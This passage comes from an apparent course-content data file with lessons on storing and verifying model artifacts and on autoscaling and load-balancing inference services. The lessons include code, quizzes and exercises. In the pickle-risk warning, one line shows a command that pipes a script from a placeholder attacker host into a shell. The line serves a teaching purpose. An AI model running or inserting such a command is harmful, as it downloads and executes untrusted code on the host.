Expected SHA-256: 622a559868be3c90e6ce751c17ee123b7e77a284e311548f075d9e504c6a0c0a
Integrity Status: VERIFIED`,
    },

    lineByLineExplanation: [
      {
        lines: '1-4',
        codeSnippet: 'computed_hash = hashlib.sha256(model_bytes).hexdigest()',
        explanation: 'Computes cryptographic SHA-256 checksum over the raw model byte buffer.',
      },
      {
        lines: '5-9',
        codeSnippet: 'is_valid = computed_hash == expected_hash; print(...)',
        explanation: 'Compares the computed digest with the manifest hash, rejecting corrupted or tampered files before loading.',
      },
      {
        lines: '10-15',
        codeSnippet: 'verify_model_integrity(sample_weights, valid_hash)',
        explanation: 'Executes the integrity validation test and outputs confirmation status.',
      },
    ],

    hyperparameters: [
      {
        name: 'Presigned URL TTL',
        defaultVal: '900s (15 min)',
        range: '60s to 3600s',
        effect: 'Time window during which a client can download an artifact before the authorization signature expires',
        recommendation: 'Keep short (5-15 mins) to minimize exposure if URLs are intercepted.',
      },
      {
        name: 'Multipart Chunk Size',
        defaultVal: '64 MB',
        range: '5 MB to 512 MB',
        effect: 'Size of individual chunks in multipart uploads',
        recommendation: 'Use 64MB for high throughput and reliable recovery on standard internet connections.',
      },
    ],

    assumptions: [
      {
        assumption: 'Immutable Artifacts',
        whyItMatters: 'If a model artifact at `s3://models/v2/model.safetensors` is overwritten in place, different pods may run different versions with identical version tags.',
        howToVerify: 'Enforce S3 bucket object versioning or write to unique cryptographic hash keys.',
      },
    ],

    commonMistakes: [
      {
        mistake: 'Using Python `pickle.load()` on model weights downloaded from untrusted or public sources',
        solution: 'Use `safetensors.torch.load_file()` or ONNX format for serialized neural networks.',
        whyWrong: 'Pickle can execute arbitrary shell commands (e.g. `os.system("curl attacker.com | sh")`) during deserialization.',
        howToFix: 'Convert all PyTorch `.pt` or `.bin` pickle files to `.safetensors`.',
      },
      {
        mistake: 'Streaming large multi-gigabyte video or model downloads through the Python API worker process',
        solution: 'Generate a Presigned URL and redirect the client (HTTP 307) to download directly from object storage.',
        whyWrong: 'Streaming gigabytes through Python saturates worker memory and blocks the event loop.',
        howToFix: 'Offload client downloads directly to S3 / CloudFront via presigned URLs.',
      },
    ],

    realWorldUseCases: [
      {
        title: 'Enterprise Model Weights Distribution',
        description: 'Distributing a 7B parameter LLM (14 GB Safetensors) to 20 GPU worker nodes using S3 bucket replication and local NVMe caching.',
      },
      {
        title: 'Medical Imaging DICOM Upload Service',
        description: 'Using presigned S3 URLs to allow hospital MRI scanners to upload 2GB scans directly to cloud buckets with zero API gateway bandwidth overhead.',
      },
    ],

    practiceQuestions: [
      {
        id: 'q1',
        question: 'Why is the Hugging Face `Safetensors` format preferred over traditional PyTorch `pickle` (.pt / .bin) files?',
        answer: 'Safetensors contains only raw tensor buffers and a JSON metadata header, making arbitrary code execution impossible, whereas pickle can execute arbitrary Python commands upon deserialization.',
        explanation: 'Safetensors also supports zero-copy memory mapping (`mmap`) for instant model loading.',
      },
      {
        id: 'q2',
        question: 'What is a Presigned URL and why is it useful when handling large files?',
        answer: 'It is a time-limited URL containing cryptographic signatures that grants temporary read or write access to a private object in cloud storage, offloading heavy file transfer bandwidth from your API servers.',
        explanation: 'Clients download or upload directly to S3 without consuming Python API server memory.',
      },
      {
        id: 'q3',
        question: 'Why should model weights never be baked directly into production Docker images?',
        answer: 'Baking weights causes images to balloon to gigabytes, drastically slows down CI/CD builds and container pull times during autoscaling, and tightly couples model updates to software releases.',
        explanation: 'Store weights in object storage and download them at runtime or mount them via network volumes.',
      },
    ],

    quiz: [
      {
        id: 'quiz-1',
        question: 'What serious security vulnerability is inherent in Python’s `pickle` serialization format?',
        options: [
          'It cannot store floating point numbers',
          'It allows arbitrary remote code execution (RCE) during deserialization',
          'It is limited to files smaller than 10 MB',
          'It only works on Windows operating systems',
        ],
        correctIndex: 1,
        explanation: 'Pickle’s virtual machine allows malicious constructors to execute arbitrary shell commands when `pickle.load()` is called.',
      },
      {
        id: 'quiz-2',
        question: 'How does object storage (e.g. AWS S3, Google Cloud Storage, MinIO) differ from block storage (EBS / local SSD)?',
        options: [
          'Object storage is accessed via HTTP REST APIs with infinite elasticity and flat key-value namespace, whereas block storage is attached as raw drive volumes to a single VM',
          'Object storage is only for text files',
          'Block storage is completely free',
          'Object storage deletes files after 24 hours',
        ],
        correctIndex: 0,
        explanation: 'Object storage treats files as immutable objects accessed via HTTP, making it ideal for distributed model weights and datasets.',
      },
      {
        id: 'quiz-3',
        question: 'What is the primary benefit of a multipart upload for a 15 GB deep learning model checkpoint?',
        options: [
          'It compresses the model weights by 90%',
          'It splits the upload into independent parallel chunks; if one chunk fails, only that chunk is retried rather than the entire 15 GB',
          'It converts PyTorch to TensorFlow automatically',
          'It encrypts the file without keys',
        ],
        correctIndex: 1,
        explanation: 'Multipart uploads allow parallelization and fault tolerance: network glitches only require retrying individual 64MB chunks.',
      },
      {
        id: 'quiz-4',
        question: 'What does a SHA-256 checksum verify after a container downloads model weights from object storage?',
        options: [
          'The model’s accuracy score on ImageNet',
          'That the downloaded byte sequence exactly matches the author’s file and was not corrupted in transit or maliciously tampered with',
          'The GPU temperature',
          'The number of layers in the neural network',
        ],
        correctIndex: 1,
        explanation: 'Cryptographic hashes provide mathematical certainty that the file is complete, uncorrupted, and authentic.',
      },
    ],

    independentExercise: {
      title: 'Build a Model Artifact Downloader with Hash Verification',
      problem:
        'Write a Python function `download_and_verify_model(storage, key, expected_sha256)` that downloads an object from storage, verifies its SHA-256 hash, and saves it to disk only if the hash matches, raising a `ValueError` if corrupted.',
      hints: [
        'Use `hashlib.sha256(data).hexdigest()` to compute the hash',
        'Compare against `expected_sha256`',
        'If mismatch, do not write to destination file and raise ValueError',
      ],
      starterCode: `import hashlib

def download_and_verify_model(storage_client, key: str, expected_sha256: str, target_path: str) -> bool:
    # TODO: Implement download and verification
    pass
`,
      solution: `import hashlib

def download_and_verify_model(storage_client, key: str, expected_sha256: str, target_path: str) -> bool:
    # 1. Fetch object from storage
    data, _ = storage_client.get_object(key)
    
    # 2. Compute SHA-256
    computed_sha256 = hashlib.sha256(data).hexdigest()
    if computed_sha256 != expected_sha256:
        raise ValueError(
            f"Integrity check failed for '{key}'! Computed: {computed_sha256}, Expected: {expected_sha256}"
        )
        
    # 3. Write verified artifact
    with open(target_path, "wb") as f:
        f.write(data)
        
    return True
`,
    },

    summary: {
      keyTakeaways: [
        'Store model weights in cloud object storage (S3/GCS/MinIO) rather than baking heavy binaries into Docker images',
        'Replace insecure `pickle` files with `Safetensors` to prevent arbitrary remote code execution vulnerabilities',
        'Verify SHA-256 checksums upon download and use presigned URLs to offload high-bandwidth transfers from API servers',
      ],
      nextLessonId: 'deploy-09-scaling-load-balancing',
      nextLessonTitle: 'Deploy-09: Scaling & Load Balancing AI Inference Services',
      nextLessonModuleId: 'p11-m9',
    },
  },

  'deploy-09-scaling-load-balancing': {
    id: 'deploy-09-scaling-load-balancing',
    moduleId: 'p11-m9',
    title: 'Deploy-09: Scaling & Load Balancing AI Inference Services',
    subtitle: 'Horizontal Autoscaling, Reverse Proxies, Concurrency & Traffic Spikes',
    order: 1,
    readTimeMinutes: 37,
    difficulty: 'Advanced',
    visualizerType: 'deploy-scaling-lb-explorer',

    objectives: [
      'Compare vertical scaling (scale-up) vs horizontal scaling (scale-out) for CPU and GPU inference services',
      'Analyze load balancing algorithms: Round Robin, Least Connections, and IP Hash (sticky sessions)',
      'Calculate required cluster replicas using the Kubernetes Horizontal Pod Autoscaler (HPA) formula',
      'Distinguish CPU-bound from GPU-bound inference bottlenecks and configure appropriate scaling metrics',
      'Implement backpressure and load-shedding strategies to protect clusters during catastrophic traffic spikes',
    ],

    prerequisites: [
      'Deploy-01 (Deployment Fundamentals) and Deploy-05 (FastAPI)',
      'Understanding of Little’s Law ($L = \\lambda W$)',
    ],
    previousLesson: {
      id: 'deploy-08-storage-artifacts',
      title: 'Deploy-08: Cloud Storage & Model Artifact Management',
      moduleId: 'p11-m8',
    },

    analogy: {
      title: 'The Supermarket Checkout Lanes vs. A Single Super-Cashier',
      text: 'Scaling an inference cluster is like managing a bustling supermarket on the eve of a holiday. Vertical scaling is like hiring a single superhuman cashier who scans groceries 4 times faster: it helps up to a biological limit, but if the cashier catches the flu (hardware failure), the entire store halts, and eventually you can’t buy a faster human at any price. Horizontal scaling is opening 12 standard checkout lanes side-by-side with a queue director (Load Balancer) guiding incoming shoppers to whichever lane has the fewest carts waiting (Least Connections).',
      metaphor: 'Vertical scaling buys a bigger machine; horizontal scaling coordinates a fleet of identical worker replicas.',
    },

    problemSolved: {
      title: 'Surviving Extreme Traffic Spikes Without Meltdowns',
      description:
        'When an AI service goes viral or experiences sudden surge traffic (e.g. Black Friday or breaking news), single-instance servers suffer thread starvation. Requests queue up, latency degrades from 30ms to 20 seconds, and the server crashes from memory exhaustion.',
      keyPoints: [
        'Vertical scaling hits severe hardware limits and requires downtime to resize cloud instances',
        'Horizontal scaling adds stateless replicas dynamically behind a load balancer without service interruptions',
        'Least Connections load balancing prevents fast-to-compute queries from getting stuck behind slow, complex inferences',
        'Load shedding intentionally drops excess requests with HTTP 503 rather than allowing the entire cluster to crash',
      ],
    },

    intuition: {
      overview:
        'Horizontal scaling balances traffic across a dynamic pool of stateless replicas, automatically adding pods when utilization crosses safety thresholds and shedding load if capacity is exceeded.',
      steps: [
        {
          step: 1,
          title: 'Load Balancer Ingress',
          description:
            'Nginx, HAProxy, or an AWS Application Load Balancer terminates client connections and evaluates active replica health.',
        },
        {
          step: 2,
          title: 'Dispatch Algorithm Selection',
          description:
            'Round Robin works well for uniform workloads. Least Connections is far superior for AI models where input sequence length causes variable execution times.',
        },
        {
          step: 3,
          title: 'Autoscaler Metrics Evaluation',
          description:
            'Kubernetes Horizontal Pod Autoscaler (HPA) polls metrics every 15s. If average CPU utilization exceeds 70%, it scales up replicas.',
        },
        {
          step: 4,
          title: 'Backpressure and Graceful Degradation',
          description:
            'If traffic spikes faster than new containers can boot (cold start lag), the gateway sheds excess load with HTTP 503 to preserve low latency for admitted requests.',
        },
      ],
    },

    mathematics: {
      overview:
        'Autoscaling algorithms compute desired replica counts by comparing observed metrics against target utilization thresholds.',
      foundations: [
        {
          name: 'Horizontal Pod Autoscaler (HPA) Replica Formula',
          latex: 'R_{\\text{desired}} = \\left\\lceil R_{\\text{current}} \\times \\frac{\\text{Current Metric}}{\\text{Target Metric}} \\right\\rceil',
          explanation:
            'Standard Kubernetes scaling formula. For example, if 4 replicas are at 90% CPU and the target is 60%, desired replicas = ceil(4 * (90/60)) = 6 replicas.',
        },
        {
          name: 'Amdahl’s Law for Parallel Processing',
          latex: 'S_{\\text{latency}} = \\frac{1}{(1 - p) + \\frac{p}{N}}',
          explanation:
            'The theoretical speedup of an inference pipeline across N parallel nodes is strictly limited by the non-parallelizable serial fraction (1 - p) such as model weight loading and response aggregation.',
        },
      ],
    },

    derivation: {
      title: 'Derivation of Required Replicas Under Latency SLA Constraints',
      objective: 'Calculate the minimum replica count to guarantee P95 latency under a surge of lambda requests/second.',
      steps: [
        {
          step: 1,
          label: 'Single Replica Maximum Safe Throughput',
          latex: '\\mu_{\\text{safe}} = \\frac{\\text{Target Utilization}}{T_{\\text{infer}}} = \\frac{0.70}{0.035 \\text{ s}} = 20 \\text{ req/sec}',
          explanation: 'At 35ms service time and 70% target utilization, one replica safely processes 20 RPS.',
        },
        {
          step: 2,
          label: 'Total Cluster Throughput Requirement',
          latex: '\\Lambda_{\\text{peak}} = 300 \\text{ req/sec}',
          explanation: 'Peak incoming traffic volume during marketing campaign.',
        },
        {
          step: 3,
          label: 'Required Replicas',
          latex: 'R = \\left\\lceil \\frac{\\Lambda_{\\text{peak}}}{\\mu_{\\text{safe}}} \\right\\rceil = \\left\\lceil \\frac{300}{20} \\right\\rceil = 15 \\text{ replicas}',
          explanation: 'The cluster requires 15 replicas to maintain target utilization and prevent queue latency explosion.',
        },
      ],
    },

    variables: [
      { symbol: 'R_{\\text{desired}}', name: 'Desired Replicas', description: 'Number of pods the autoscaler calculates is necessary to satisfy target metrics' },
      { symbol: 'R_{\\text{current}}', name: 'Current Replicas', description: 'Number of pods currently running and healthy in the cluster' },
      { symbol: '\\Lambda_{\\text{peak}}', name: 'Peak Arrival Rate', description: 'Maximum incoming request volume in requests per second (RPS)' },
      { symbol: '\\mu_{\\text{safe}}', name: 'Safe Service Rate', description: 'Throughput capacity of a single pod before queueing delays manifest' },
    ],

    numericalExample: {
      scenario: 'A Kubernetes cluster currently has 5 pods running at an average of 84% CPU utilization. The target HPA threshold is 60%.',
      dataset: [
        { metric: 'Current Pods (R_current)', value: '5 pods' },
        { metric: 'Current Utilization', value: '84%' },
        { metric: 'Target Utilization', value: '60%' },
      ],
      calculations: [
        {
          step: '1. Ratio of Current to Target Metric',
          math: '84 / 60',
          result: '1.40',
        },
        {
          step: '2. Desired Replica Count',
          math: 'ceil(5 * 1.40)',
          result: 'ceil(7.0) = 7 pods',
        },
      ],
      finalConclusion: 'The HPA will automatically trigger the creation of 2 additional pods, expanding the fleet from 5 to 7 replicas.',
    },

    visualExplanation: {
      title: 'Scaling & Load Balancer Simulator Visualizer',
      description:
        'The interactive visualizer simulates traffic distribution across backend worker replicas. Switch between Round Robin, Least Connections, and IP Hash algorithms, adjust traffic volume, and toggle Horizontal Pod Autoscaling (HPA).',
      features: [
        'Watch live CPU utilization and queue depth bars update across replica pods',
        'Observe how IP Hash can cause hot-shard skew on Pod #1 when a single large client generates disproportionate traffic',
        'Test HPA autoscaling triggers that dynamically add worker pods when cluster CPU exceeds 70%',
      ],
    },

    scratchCode: {
      title: 'Python from Scratch: Load Balancer Dispatcher with Least-Connections',
      explanation: 'Simulates Round Robin and Least Connections load balancing algorithms across a cluster of worker instances.',
      code: `class MockWorkerInstance:
    def __init__(self, instance_id: str, capacity_rps: int = 100):
        self.id = instance_id
        self.capacity = capacity_rps
        self.active_connections = 0

    def process(self):
        self.active_connections += 1

    def release(self):
        if self.active_connections > 0:
            self.active_connections -= 1

class LoadBalancer:
    def __init__(self, workers: list[MockWorkerInstance]):
        self.workers = workers
        self.rr_index = 0

    def dispatch_round_robin(self) -> MockWorkerInstance:
        worker = self.workers[self.rr_index]
        self.rr_index = (self.rr_index + 1) % len(self.workers)
        worker.process()
        return worker

    def dispatch_least_connections(self) -> MockWorkerInstance:
        # Find worker with lowest active connections
        worker = min(self.workers, key=lambda w: w.active_connections)
        worker.process()
        return worker

if __name__ == "__main__":
    cluster = [MockWorkerInstance(f"pod-{i+1}") for i in range(3)]
    lb = LoadBalancer(cluster)
    
    # Simulate non-uniform job completions
    cluster[0].active_connections = 4
    cluster[1].active_connections = 1
    cluster[2].active_connections = 3
    
    routed = lb.dispatch_least_connections()
    print(f"Least Connections routed to: {routed.id} (had fewest active connections)")
`,
    },

    sklearnCode: {
      title: 'Kubernetes HorizontalPodAutoscaler (HPA) Specification (hpa.yaml)',
      explanation: 'Complete declarative Kubernetes HPA manifest scaling pods between 2 and 15 replicas based on CPU and memory metrics.',
      code: `apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata:
  name: aiml-inference-hpa
  namespace: production
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: aiml-inference-api
  minReplicas: 2
  maxReplicas: 15
  metrics:
    # Scale when average CPU utilization across pods exceeds 70%
    - type: Resource
      resource:
        name: cpu
        target:
          type: Utilization
          averageUtilization: 70
    # Secondary safety scale when memory utilization exceeds 80%
    - type: Resource
      resource:
        name: memory
        target:
          type: Utilization
          averageUtilization: 80
  behavior:
    scaleUp:
      stabilizationWindowSeconds: 0 # React immediately to surges
      policies:
        - type: Percent
          value: 100
          periodSeconds: 15 # Double replicas every 15s if needed
    scaleDown:
      stabilizationWindowSeconds: 300 # Wait 5 minutes before downscaling to prevent flapping
`,
    },

    runnableCode: {
      code: `import math

def calculate_hpa_scaling(current_pods: int, current_cpu: float, target_cpu: float = 70.0) -> int:
    desired = math.ceil(current_pods * (current_cpu / target_cpu))
    return desired

# Simulate traffic surge
print("=== KUBERNETES HPA AUTOSCALING LOGIC ===")
for cpu in [50.0, 75.0, 92.0, 115.0]:
    desired_replicas = calculate_hpa_scaling(current_pods=4, current_cpu=cpu, target_cpu=70.0)
    print(f"Current Pods: 4 | Average CPU: {cpu:5.1f}% | Desired Replicas: {desired_replicas:2d}")
`,
      expectedOutput: `=== KUBERNETES HPA AUTOSCALING LOGIC ===
Current Pods: 4 | Average CPU:  50.0% | Desired Replicas:  3
Current Pods: 4 | Average CPU:  75.0% | Desired Replicas:  5
Current Pods: 4 | Average CPU:  92.0% | Desired Replicas:  6
Current Pods: 4 | Average CPU: 115.0% | Desired Replicas:  7`,
    },

    lineByLineExplanation: [
      {
        lines: '1-5',
        codeSnippet: 'desired = math.ceil(current_pods * (current_cpu / target_cpu))',
        explanation: 'Implements the official Kubernetes HPA scaling equation.',
      },
      {
        lines: '6-10',
        codeSnippet: 'for cpu in [50.0, 75.0, 92.0, 115.0]: ...',
        explanation: 'Evaluates scaling responses across normal, moderate, high, and severe CPU saturation levels.',
      },
    ],

    hyperparameters: [
      {
        name: 'targetCPUUtilizationPercentage',
        defaultVal: '70%',
        range: '50% to 80%',
        effect: 'Target average CPU across pods before the autoscaler triggers scale-up events',
        recommendation: 'Keep at 60-70% to maintain sufficient headroom during container cold starts.',
      },
      {
        name: 'scaleDown.stabilizationWindowSeconds',
        defaultVal: '300s (5 min)',
        range: '60s to 600s',
        effect: 'Cool-down period before terminating excess pods after traffic subsides',
        recommendation: 'Keep at 300s to avoid flapping (rapid cycle of scaling up and down).',
      },
    ],

    assumptions: [
      {
        assumption: 'Uniform Pod Capacity',
        whyItMatters: 'If some pods are assigned to older slow CPU nodes while others are on fast nodes, Round Robin will bottleneck on the slowest node.',
        howToVerify: 'Use Least Connections routing and standardize compute instance types across the cluster.',
      },
    ],

    commonMistakes: [
      {
        mistake: 'Using IP Hash load balancing when many users share a single corporate NAT proxy or university IP',
        solution: 'Use Least Connections or Round Robin with standard HTTP cookie session affinity if state is strictly required.',
        whyWrong: 'Thousands of users sharing one public IP get routed to the same single worker pod, causing it to crash while other pods sit idle.',
        howToFix: 'Avoid IP Hash for public customer-facing web services.',
      },
      {
        mistake: 'Failing to configure a scale-down stabilization window, causing "autoscaler flapping"',
        solution: 'Configure a 5-minute stabilization window (`scaleDown.stabilizationWindowSeconds: 300`).',
        whyWrong: 'Replicas are constantly created and destroyed every minute, wasting resources and thrashing model loading.',
        howToFix: 'Set a conservative scale-down delay.',
      },
    ],

    realWorldUseCases: [
      {
        title: 'Flash Sale Fraud Detection Scaling',
        description: 'Autoscaling an XGBoost fraud API from 6 to 48 pods in 90 seconds to process a Black Friday e-commerce spike.',
      },
      {
        title: 'Dynamic Vision Inference Pool',
        description: 'Using Least Connections load balancing to distribute OCR document processing jobs evenly across GPU workers.',
      },
    ],

    practiceQuestions: [
      {
        id: 'q1',
        question: 'Why is Least Connections load balancing generally superior to Round Robin for machine learning model inference?',
        answer: 'Because model inference execution times vary significantly depending on input size (e.g. prompt length, image resolution, token count). Least Connections routes requests to whichever worker currently has the lightest active workload.',
        explanation: 'Round Robin blindly sends requests in a circle, potentially stacking multiple heavy requests on the same worker.',
      },
      {
        id: 'q2',
        question: 'What is "autoscaler flapping" and how is it prevented in production Kubernetes clusters?',
        answer: 'Flapping is the rapid, undesirable cycle of scaling up and immediately scaling down due to momentary traffic jitter. It is prevented by configuring a scale-down stabilization window (e.g. 5 minutes).',
        explanation: 'Stabilization windows ensure the autoscaler verifies traffic has genuinely subsided before terminating pods.',
      },
      {
        id: 'q3',
        question: 'What is load shedding and why is it preferred over letting an inference cluster queue requests indefinitely?',
        answer: 'Load shedding intentionally rejects excess requests with HTTP 503 Service Unavailable when the system is near collapse. This preserves low latency and 100% success for admitted requests rather than letting all requests timeout and crash the cluster.',
        explanation: 'Graceful degradation is a core site reliability engineering principle.',
      },
    ],

    quiz: [
      {
        id: 'quiz-1',
        question: 'What is the primary difference between vertical scaling and horizontal scaling?',
        options: [
          'Vertical scaling adds more CPU/RAM to a single machine; horizontal scaling adds more replica machines behind a load balancer',
          'Vertical scaling is only for databases; horizontal scaling is only for HTML',
          'Vertical scaling is free, whereas horizontal scaling requires a license',
          'There is no difference in cloud architecture',
        ],
        correctIndex: 0,
        explanation: 'Vertical scales up instance size (has hardware limits); horizontal scales out by adding independent replica nodes.',
      },
      {
        id: 'quiz-2',
        question: 'A Kubernetes cluster currently has 6 pods running at 90% CPU. The HPA target is 60%. How many desired pods will the autoscaler calculate?',
        options: ['6 pods', '8 pods', '9 pods', '12 pods'],
        correctIndex: 2,
        explanation: 'Desired = ceil(6 * (90 / 60)) = ceil(6 * 1.5) = 9 pods.',
      },
      {
        id: 'quiz-3',
        question: 'Which load balancing algorithm can suffer severe load imbalance when thousands of users connect from behind a single corporate enterprise NAT IP?',
        options: ['Round Robin', 'Least Connections', 'IP Hash (Sticky IP)', 'Random Selection'],
        correctIndex: 2,
        explanation: 'IP Hash maps all requests from the same source IP to the exact same backend replica, overwhelming that single pod.',
      },
      {
        id: 'quiz-4',
        question: 'What HTTP status code should an API gateway return when executing load shedding to protect overwhelmed backend workers?',
        options: ['200 OK', '404 Not Found', '503 Service Unavailable', '418 I’m a teapot'],
        correctIndex: 2,
        explanation: 'HTTP 503 Service Unavailable signals to clients and CDN load balancers that the server is temporarily overloaded and requests should be retried with backoff.',
      },
    ],

    independentExercise: {
      title: 'Build a Concurrency-Bounded Load Shedding Middleware',
      problem:
        'Write an async Python ASGI middleware `LoadSheddingMiddleware(app, max_concurrent_requests)` that tracks active in-flight requests and immediately rejects new requests with HTTP 503 if active concurrency exceeds `max_concurrent_requests`.',
      hints: [
        'Maintain an integer counter `self.active_requests`',
        'If `self.active_requests >= max_concurrent_requests`, return HTTP 503 JSON response immediately',
        'Use `try...finally` to ensure `self.active_requests -= 1` always executes',
      ],
      starterCode: `class LoadSheddingMiddleware:
    def __init__(self, app, max_concurrency: int = 50):
        self.app = app
        self.max_concurrency = max_concurrency
        self.active_requests = 0

    async def __call__(self, scope, receive, send):
        # TODO: Implement load shedding
        pass
`,
      solution: `class LoadSheddingMiddleware:
    def __init__(self, app, max_concurrency: int = 50):
        self.app = app
        self.max_concurrency = max_concurrency
        self.active_requests = 0

    async def __call__(self, scope, receive, send):
        if scope["type"] != "http":
            await self.app(scope, receive, send)
            return

        if self.active_requests >= self.max_concurrency:
            # Shed load immediately
            response_body = b'{"error": "Service Overloaded", "detail": "Active concurrency limit reached."}'
            await send({
                "type": "http.response.start",
                "status": 503,
                "headers": [
                    (b"content-type", b"application/json"),
                    (b"retry-after", b"2"),
                ],
            })
            await send({
                "type": "http.response.body",
                "body": response_body,
            })
            return

        self.active_requests += 1
        try:
            await self.app(scope, receive, send)
        finally:
            self.active_requests -= 1
`,
    },

    summary: {
      keyTakeaways: [
        'Horizontal scaling provides elastic resilience by adding identical stateless worker replicas behind a load balancer',
        'Least Connections load balancing prevents variable-duration inference jobs from piling up on single workers',
        'Implement load shedding (HTTP 503) to preserve latency and stability for admitted traffic during sudden extreme spikes',
      ],
      nextLessonId: 'deploy-10-background-async-jobs',
      nextLessonTitle: 'Deploy-10: Background Jobs & Asynchronous Inference',
      nextLessonModuleId: 'p11-m10',
    },
  },
};
